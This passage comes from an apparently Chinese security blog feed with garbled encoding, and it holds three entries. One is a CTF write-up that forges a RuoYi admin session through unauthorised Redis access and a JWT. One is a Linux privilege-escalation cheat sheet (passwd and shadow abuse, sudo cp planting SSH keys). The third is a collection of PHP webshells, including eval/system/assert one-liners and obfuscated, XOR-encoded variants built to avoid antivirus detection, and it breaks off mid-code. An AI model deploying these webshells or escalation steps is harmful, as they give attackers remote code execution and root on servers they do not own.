        <content type="html"><![CDATA[<h2 id="ç»Ÿä¸€é—¨æ´¾"><a href="#ç»Ÿä¸€é—¨æ´¾" class="headerlink" title="ç»Ÿä¸€é—¨æ´¾"></a>ç»Ÿä¸€é—¨æ´¾</h2><p>è‹¥ä¾å¼€æºå¿«é€Ÿå¼€å‘å¹³å°ï¼š<a href="https://gitee.com/y_project/RuoYi-Vue">https://gitee.com/y_project/RuoYi-Vue</a></p><ul><li>å‰ç«¯é‡‡ç”¨Vueã€Element UI</li><li>åç«¯é‡‡ç”¨Spring Bootã€Spring Securityã€Redis &amp; Jwt</li><li>æƒé™è®¤è¯ä½¿ç”¨Jwtï¼Œæ”¯æŒå¤šç»ˆç«¯è®¤è¯ç³»ç»Ÿ</li></ul><p>ç«¯å£å¼€æ”¾äº† Redis çš„ 6379ï¼Œå¯ä»¥è¿›è¡Œæœªæˆæƒè®¿é—®ï¼š</p><p><img src="https://i.loli.net/2021/05/14/QaUGoWvY5VECknF.png"></p><p><code>keys *</code> ä¼šå‘ç°å­˜åœ¨ä¸€ä¸ªç¼“å­˜äº†ç”¨æˆ·ç™»å½• token çš„ <code>login_tokens:3109ec3f-6e84-48f5-bc1f-4f351d236333</code>ï¼ˆå…¶å®ƒçš„éƒ½æ˜¯åˆ«çš„å¸ˆå‚…åœ¨æ‰“è¿™ä¸ªç¯å¢ƒçš„æ—¶å€™ç•™ä¸‹çš„ã€‚ã€‚ï¼‰ï¼Œå¯ä»¥ get ä¸€ä¸‹ï¼š<code>get &quot;login_tokens:3109ec3f-6e84-48f5-bc1f-4f351d236333&quot;</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.ruoyi.common.core.domain.model.LoginUser\&quot;,\&quot;accountNonExpired\&quot;:true,\&quot;accountNonLocked\&quot;:true,\&quot;browser\&quot;:\&quot;Chrome 9\&quot;,\&quot;credentialsNonExpired\&quot;:true,\&quot;enabled\&quot;:true,\&quot;expireTime\&quot;:1690354819542,\&quot;ipaddr\&quot;:\&quot;117.175.182.182\&quot;,\&quot;loginLocation\&quot;:\&quot;XX XX\&quot;,\&quot;loginTime\&quot;:1620354879542,\&quot;os\&quot;:\&quot;Windows 10\&quot;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;permissions\&quot;:Set[\&quot;*:*:*\&quot;],\&quot;token\&quot;:\&quot;07aaf192-ca8f-4db7-a6a2-ee81dbf07d58\&quot;,\&quot;user\&quot;:&#123;\&quot;admin\&quot;:true,\&quot;avatar\&quot;:\&quot;\&quot;,\&quot;createBy\&quot;:\&quot;admin\&quot;,\&quot;createTime\&quot;:1620186031000,\&quot;delFlag\&quot;:\&quot;0\&quot;,\&quot;dept\&quot;:&#123;\&quot;children\&quot;:[],\&quot;deptId\&quot;:103,\&quot;deptName\&quot;:\&quot;\xe7\xa0\x94\xe5\x8f\x91\xe9\x83\xa8\xe9\x97\xa8\&quot;,\&quot;leader\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;orderNum\&quot;:\&quot;1\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;parentId\&quot;:101,\&quot;status\&quot;:\&quot;0\&quot;&#125;,\&quot;deptId\&quot;:103,\&quot;email\&quot;:\&quot;ry@163.com\&quot;,\&quot;loginDate\&quot;:1620186031000,\&quot;loginIp\&quot;:\&quot;127.0.0.1\&quot;,\&quot;nickName\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;phonenumber\&quot;:\&quot;15888888888\&quot;,\&quot;remark\&quot;:\&quot;\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roles\&quot;:[&#123;\&quot;admin\&quot;:true,\&quot;dataScope\&quot;:\&quot;1\&quot;,\&quot;deptCheckStrictly\&quot;:false,\&quot;flag\&quot;:false,\&quot;menuCheckStrictly\&quot;:false,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;roleId\&quot;:1,\&quot;roleKey\&quot;:\&quot;admin\&quot;,\&quot;roleName\&quot;:\&quot;\xe8\xb6\x85\xe7\xba\xa7\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roleSort\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;&#125;],\&quot;sex\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;,\&quot;userId\&quot;:1,\&quot;userName\&quot;:\&quot;admin\&quot;&#125;,\&quot;username\&quot;:\&quot;admin\&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>çŒœæµ‹ JWT çš„å¯†é’¥ä¸ºé»˜è®¤å¯†é’¥ï¼Œå¯ä»¥ä¼ªé€  Admin-Token ç™»å½•ï¼Œç›´æ¥ä¸Šæ¼”ç¤ºåœ°å€è·å–ä¸€ä¸‹ï¼š<a href="http://vue.ruoyi.vip/index">http://vue.ruoyi.vip/index</a></p><p><img src="https://i.loli.net/2021/05/14/AO9EX5cQRCtDzrB.png"></p><p>Base64 è§£ç ä¸€ä¸‹å°±æœ‰ï¼š</p><p><img src="https://i.loli.net/2021/05/14/6kwOlC5eGRtbDhW.png"></p><p>ç„¶å set ä¸€ä¸ªæ–°çš„ login_tokensï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set login_tokens:f4c75427-0b4a-493c-9987-db9f8c9f4cda &quot;&#123;\&quot;@type\&quot;:\&quot;com.ruoyi.common.core.domain.model.LoginUser\&quot;,\&quot;accountNonExpired\&quot;:true,\&quot;accountNonLocked\&quot;:true,\&quot;browser\&quot;:\&quot;Chrome 9\&quot;,\&quot;credentialsNonExpired\&quot;:true,\&quot;enabled\&quot;:true,\&quot;expireTime\&quot;:1690354819542,\&quot;ipaddr\&quot;:\&quot;117.175.182.182\&quot;,\&quot;loginLocation\&quot;:\&quot;XX XX\&quot;,\&quot;loginTime\&quot;:1620354879542,\&quot;os\&quot;:\&quot;Windows 10\&quot;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;permissions\&quot;:Set[\&quot;*:*:*\&quot;],\&quot;token\&quot;:\&quot;07aaf192-ca8f-4db7-a6a2-ee81dbf07d58\&quot;,\&quot;user\&quot;:&#123;\&quot;admin\&quot;:true,\&quot;avatar\&quot;:\&quot;\&quot;,\&quot;createBy\&quot;:\&quot;admin\&quot;,\&quot;createTime\&quot;:1620186031000,\&quot;delFlag\&quot;:\&quot;0\&quot;,\&quot;dept\&quot;:&#123;\&quot;children\&quot;:[],\&quot;deptId\&quot;:103,\&quot;deptName\&quot;:\&quot;\xe7\xa0\x94\xe5\x8f\x91\xe9\x83\xa8\xe9\x97\xa8\&quot;,\&quot;leader\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;orderNum\&quot;:\&quot;1\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;parentId\&quot;:101,\&quot;status\&quot;:\&quot;0\&quot;&#125;,\&quot;deptId\&quot;:103,\&quot;email\&quot;:\&quot;ry@163.com\&quot;,\&quot;loginDate\&quot;:1620186031000,\&quot;loginIp\&quot;:\&quot;127.0.0.1\&quot;,\&quot;nickName\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;phonenumber\&quot;:\&quot;15888888888\&quot;,\&quot;remark\&quot;:\&quot;\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roles\&quot;:[&#123;\&quot;admin\&quot;:true,\&quot;dataScope\&quot;:\&quot;1\&quot;,\&quot;deptCheckStrictly\&quot;:false,\&quot;flag\&quot;:false,\&quot;menuCheckStrictly\&quot;:false,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;roleId\&quot;:1,\&quot;roleKey\&quot;:\&quot;admin\&quot;,\&quot;roleName\&quot;:\&quot;\xe8\xb6\x85\xe7\xba\xa7\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roleSort\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;&#125;],\&quot;sex\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;,\&quot;userId\&quot;:1,\&quot;userName\&quot;:\&quot;admin\&quot;&#125;,\&quot;username\&quot;:\&quot;admin\&quot;&#125;&quot;</span><br></pre></td></tr></table></figure><p>BP æ”¹ä¸€ä¸‹ responseï¼š</p><p><img src="https://i.loli.net/2021/05/14/me5PWivzr6MGcB9.png"></p><p>åŸæ¥çš„æ˜¯ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;msg&quot;</span>:<span class="string">&quot;ç”¨æˆ·ä¸å­˜åœ¨/å¯†ç é”™è¯¯&quot;</span>,<span class="attr">&quot;code&quot;</span>:<span class="number">500</span>&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ”¹ä¸ºï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;msg&quot;</span>:<span class="string">&quot;Du1 says nmsl&quot;</span>,<span class="attr">&quot;code&quot;</span>:<span class="number">200</span>,<span class="attr">&quot;token&quot;</span>:<span class="string">&quot;eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6ImY0Yzc1NDI3LTBiNGEtNDkzYy05OTg3LWRiOWY4YzlmNGNkYSJ9.2Cg8jbraYAmfFtUHCjoZYcXPnP33FfvR6ud8zrTJouC_qj3C3tq2CmV2x2scXMntgO3nKeMVMuVnc1E1pbgtMg&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/14/CtJroewEv4q5jLz.jpg"></p><p>è¿™é¢˜è¿˜æœ‰ä¸ªéé¢„æœŸï¼š</p><p><img src="https://i.loli.net/2021/05/14/tEbeKH2OdVCnomf.png"></p><p>ğŸ‘´ä¹Ÿæ˜¯å¾ˆå¼‚æˆ–å‘¢ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ææƒå§¿åŠ¿å°ç»“</title>
      <link href="2021/05/13/%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E5%B0%8F%E7%BB%93/"/>
      <url>2021/05/13/%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ææƒå¯èƒ½éœ€è¦åå¼¹ shellï¼Œå› ä¸ºè„šæœ¬è¯­è¨€æ— æ³•å½¢æˆç®¡é“ï¼Œéœ€è¦åˆ›é€ ä¸€ä¸ªç®¡é“æ‰èƒ½è¿›è¡Œåç»­çš„æ“ä½œï¼Œæ¯”å¦‚æº¢å‡ºæˆåŠŸä¹‹åè¿”å›ä¸€ä¸ª root æƒé™çš„ shellï¼Œè„šæœ¬è¯­è¨€æ‰§è¡Œå®Œå°±å®Œäº†ï¼Œä¸ä¼šè¿”å›ä¸€ä¸ªå¯ä»¥æ“ä½œçš„ root shellã€‚</p></blockquote><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="0x00-å¯†ç å¤ç”¨"><a href="#0x00-å¯†ç å¤ç”¨" class="headerlink" title="0x00 å¯†ç å¤ç”¨"></a>0x00 å¯†ç å¤ç”¨</h3><p>æ•°æ®åº“ rootï¼Œåå° web å¯†ç â€¦â€¦all may root pasword</p><h3 id="0x01-passwd-shadow"><a href="#0x01-passwd-shadow" class="headerlink" title="0x01  passwd / shadow"></a>0x01  passwd / shadow</h3><p>æ£€æµ‹ /etc/passwdã€/etc/shadow æ˜¯å¦å¯è¯»å¯å†™ï¼š</p><p><img src="https://i.loli.net/2021/05/13/hOvzJUqNI7PlLYB.png"></p><ul><li>passwd å¯å†™ï¼šå¯ä»¥å°†è‡ªå·±å½“å‰ç”¨æˆ·è®¾ç½®ä¸ºä¼ª rootï¼Œä¾‹å¦‚ <code>Du1:x:1001:1001</code>ï¼Œå°†å…¶æ¢ä¸º <code>Du1:x:0:0</code></li><li>shadow å¯è¯»ï¼šç›´æ¥å°†å…¶ root çš„ hash å¤åˆ¶å‡ºæ¥ï¼Œçˆ†ç ´</li></ul><h3 id="0x02-sudo"><a href="#0x02-sudo" class="headerlink" title="0x02 sudo"></a>0x02 sudo</h3><p>sudo å¤§å®¶ç»å¸¸é‡åˆ°ï¼Œæ¯”å¦‚æ‰§è¡Œæƒé™ä¸å¤Ÿæ—¶åŠ  sudo æ‰§è¡Œï¼Œsudo æ˜¯è®©æ™®é€šç”¨æˆ·ä½¿ç”¨è¶…çº§ç”¨æˆ·çš„å‘½ä»¤ã€‚å…¶é…ç½®æ–‡ä»¶ä¸º /etc/sudoersï¼Œæ–‡ä»¶å®šä¹‰å¯ä»¥æ‰§è¡Œ sudo çš„è´¦æˆ·ã€å®šä¹‰æŸä¸ªåº”ç”¨ç¨‹åºç”¨ root è®¿é—®ã€æ˜¯å¦éœ€è¦å¯†ç éªŒè¯ã€‚</p><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/13/81TBora6WV4ZuzU.png"></p><h4 id="bin-cp"><a href="#bin-cp" class="headerlink" title="/bin/cp"></a>/bin/cp</h4><p>å¦‚æœå¯ä»¥ä»¥ guess1 èº«ä»½æ‰§è¡Œ cpï¼Œè€Œæ­¤æ—¶æˆ‘ä»¬çš„ç”¨æˆ·ä¸º guess2ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å†™å…¥ guess1 çš„ authorized_keys æ¥åŒ…å« guess2 çš„å…¬é’¥ï¼Œä»è€Œç›´æ¥ç”¨ guess2 çš„ id_rsa å…å¯† ssh ç™»å½• guess1ï¼Œå› ä¸º guess1 æ²¡æœ‰æƒé™è®¿é—® guess2ï¼Œè€Œ guess2 ä¹Ÿäº¦ç„¶ï¼Œæ‰€ä»¥å…ˆä¸¢åˆ° /tmpï¼Œå†è½¬ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp ~/.ssh/id_rsa.pub /tmp/authorized_keys</span><br><span class="line">chmod 777 /tmp/authorized_keys</span><br><span class="line">sudo -u guess1 /bin/cp /tmp/authorized_keys /home/jen/.ssh/</span><br><span class="line">ssh -i id_rsa guess1@127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/14/dbGzqjw1trkXy3s.jpg"></p><h2 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h2><h3 id="è·å–äº¤äº’å¼-shell"><a href="#è·å–äº¤äº’å¼-shell" class="headerlink" title="è·å–äº¤äº’å¼ shell"></a>è·å–äº¤äº’å¼ shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">python2 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ğŸ‘´çš„å…»é©¬åœº</title>
      <link href="2021/05/11/%F0%9F%91%B4%E7%9A%84%E5%85%BB%E9%A9%AC%E5%9C%BA/"/>
      <url>2021/05/11/%F0%9F%91%B4%E7%9A%84%E5%85%BB%E9%A9%AC%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/05/12/BoeflE1bw7ihPW8.jpg"></p><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="ç®€å•ä¸€å¥è¯"><a href="#ç®€å•ä¸€å¥è¯" class="headerlink" title="ç®€å•ä¸€å¥è¯"></a>ç®€å•ä¸€å¥è¯</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;Du1&quot;</span>]);phpinfo(); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @system(<span class="variable">$_GET</span>[<span class="string">&quot;Du1&quot;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> usort(<span class="variable">$_GET</span>,<span class="string">&#x27;asse&#x27;</span>.<span class="string">&#x27;rt&#x27;</span>);<span class="meta">?&gt;</span>  <span class="comment">// ?1=1+1&amp;2=eval($_POST[x])</span></span><br></pre></td></tr></table></figure><h3 id="å…æ€"><a href="#å…æ€" class="headerlink" title="å…æ€"></a>å…æ€</h3><h4 id="ç®€å•å…æ€"><a href="#ç®€å•å…æ€" class="headerlink" title="ç®€å•å…æ€"></a>ç®€å•å…æ€</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GLOBALS</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;_POST&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span><span class="comment">/**nice**/</span>(<span class="string">&#x27;&#x27;</span>. <span class="variable">$a</span>[<span class="variable">$str</span>][<span class="string">&#x27;cf87efe0c36a12aec113cd7982043573&#x27;</span>]. <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;absbsbebrbt&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Du1&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="variable">$_POST</span>[<span class="string">&#x27;Du1&#x27;</span>];&#125;</span><br><span class="line">@preg_replace(<span class="string">&quot;/test/e&quot;</span>, fun(), <span class="string">&quot;testtesttest&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;t&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;_GET&#x27;</span>;</span><br><span class="line">(<span class="variable">$a</span>[<span class="number">0</span>].<span class="variable">$a</span>[<span class="number">1</span>].<span class="variable">$a</span>[<span class="number">1</span>].<span class="variable">$a</span>[<span class="number">2</span>].<span class="variable">$a</span>[<span class="number">3</span>].<span class="variable">$a</span>[<span class="number">4</span>])(<span class="variable">$$b</span>[<span class="string">&#x27;Du1&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = substr_replace(<span class="string">&quot;assexx&quot;</span>,<span class="string">&quot;rt&quot;</span>,<span class="number">4</span>);</span><br><span class="line"><span class="variable">$b</span>=[<span class="string">&#x27;&#x27;</span>=&gt;<span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Du1&#x27;</span>])];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span> = (<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;\&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;4&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);<span class="variable">$___</span> = <span class="variable">$$__</span>;@<span class="keyword">eval</span>(<span class="variable">$___</span>[<span class="string">&#x27;_&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="å¼‚æˆ–è½¬ç æ•°æ®"><a href="#å¼‚æˆ–è½¬ç æ•°æ®" class="headerlink" title="å¼‚æˆ–è½¬ç æ•°æ®"></a>å¼‚æˆ–è½¬ç æ•°æ®</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = (<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = (<span class="string">&#x27;!&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&quot;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;#&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;$&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&amp;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;\&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;(&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;)&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;*&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;+&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;,&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;-&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;.&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;/&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;0&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;1&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;2&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;3&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;4&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;5&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;6&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;7&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;8&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;9&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;:&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span> =(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span 